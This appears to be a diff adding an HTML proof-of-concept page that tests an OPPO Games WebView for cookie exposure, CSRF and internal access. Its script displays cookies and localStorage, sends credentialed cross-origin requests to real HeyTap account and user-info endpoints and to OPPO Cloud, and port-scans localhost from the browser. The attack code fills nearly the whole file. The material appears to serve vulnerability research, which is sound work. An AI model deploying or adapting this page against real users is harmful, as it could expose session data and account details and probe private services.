@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OPPO Games WebView PoC - Cookie/CSRF Test</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            padding: 20px;
+            background: #1a1a2e;
+            color: #fff;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+        }
+
+        pre {
+            background: #0f0f23;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-size: 0.8em;
+        }
+
+        .success {
+            color: #4ade80;
+        }
+
+        .danger {
+            color: #f87171;
+        }
+
+        button {
+            background: #e94560;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 5px;
+            margin: 5px;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>🍪 Cookie & CSRF Test</h1>
+
+    <div class="card">
+        <h3>1. Cookie Access Test</h3>
+        <p>Cookies visible to this page:</p>
+        <pre id="cookies">Loading...</pre>
+    </div>
+
+    <div class="card">
+        <h3>2. Cross-Origin Request Test (CSRF)</h3>
+        <p>Attempting to make requests to heytap.com APIs:</p>
+        <button onclick="testHeytapAPI()">Test Heytap API</button>
+        <button onclick="testOppoCould()">Test OPPO Cloud</button>
+        <pre id="csrf-result">Click a button to test</pre>
+    </div>
+
+    <div class="card">
+        <h3>3. localStorage Access</h3>
+        <pre id="localstorage">Loading...</pre>
+    </div>
+
+    <div class="card">
+        <h3>4. Sensitive API Requests</h3>
+        <button onclick="fetchUserInfo()">Fetch User Info (if authenticated)</button>
+        <pre id="api-result">Click to test</pre>
+    </div>
+
+    <div class="card">
+        <h3>5. Internal Network Scan</h3>
+        <button onclick="scanLocalhost()">Scan localhost ports</button>
+        <pre id="scan-result">Click to scan</pre>
+    </div>
+
+    <script>
+        // Show cookies
+        document.getElementById('cookies').textContent = document.cookie || '(No cookies accessible)';
+
+        // Show localStorage
+        try {
+            const storage = {};
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                storage[key] = localStorage.getItem(key);
+            }
+            document.getElementById('localstorage').textContent =
+                Object.keys(storage).length > 0 ? JSON.stringify(storage, null, 2) : '(Empty or not accessible)';
+        } catch (e) {
+            document.getElementById('localstorage').textContent = 'Error: ' + e.message;
+        }
+
+        // CSRF test to Heytap API
+        async function testHeytapAPI() {
+            const el = document.getElementById('csrf-result');
+            el.textContent = 'Testing...';
+            try {
+                const response = await fetch('https://id-sg.heytap.com/identity/v1/authn/check', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({})
+                });
+                const text = await response.text();
+                el.textContent = `Status: ${response.status}\nResponse: ${text}`;
+            } catch (e) {
+                el.textContent = 'Error: ' + e.message;
+            }
+        }
+
+        // OPPO Cloud test
+        async function testOppoCould() {
+            const el = document.getElementById('csrf-result');
+            el.textContent = 'Testing OPPO Cloud...';
+            try {
+                const response = await fetch('https://cloud.oppo.com/', {
+                    method: 'GET',
+                    credentials: 'include'
+                });
+                el.textContent = `Status: ${response.status}\nHeaders accessible: ${response.headers.get('content-type')}`;
+            } catch (e) {
+                el.textContent = 'CORS blocked or error: ' + e.message;
+            }
+        }
+
+        // Try to fetch user info
+        async function fetchUserInfo() {
+            const el = document.getElementById('api-result');
+            el.textContent = 'Attempting to fetch user info...';
+            try {
+                const response = await fetch('https://client-uc.heytapmobi.com/uc/v1/user-info/query-detail', {
+                    method: 'POST',
+                    credentials: 'include',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({})
+                });
+                const text = await response.text();
+                el.textContent = `Status: ${response.status}\n${text}`;
+            } catch (e) {
+                el.textContent = 'Error: ' + e.message;
+            }
+        }
+
+        // Simple localhost port scan
+        async function scanLocalhost() {
+            const el = document.getElementById('scan-result');
+            el.textContent = 'Scanning common ports...\n';
+            const ports = [80, 443, 8080, 8000, 3000, 5000, 8888, 9090];
+
+            for (const port of ports) {
+                try {
+                    const controller = new AbortController();
+                    const timeout = setTimeout(() => controller.abort(), 1000);
+
+                    await fetch(`http://127.0.0.1:${port}/`, {
+                        mode: 'no-cors',
+                        signal: controller.signal
+                    });
+                    clearTimeout(timeout);
+                    el.textContent += `Port ${port}: Possibly open\n`;
+                } catch (e) {
+                    el.textContent += `Port ${port}: ${e.name === 'AbortError' ? 'Timeout' : 'Closed/Filtered'}\n`;
+                }
+            }
+        }
+    </script>
+</body>
+
+</html>
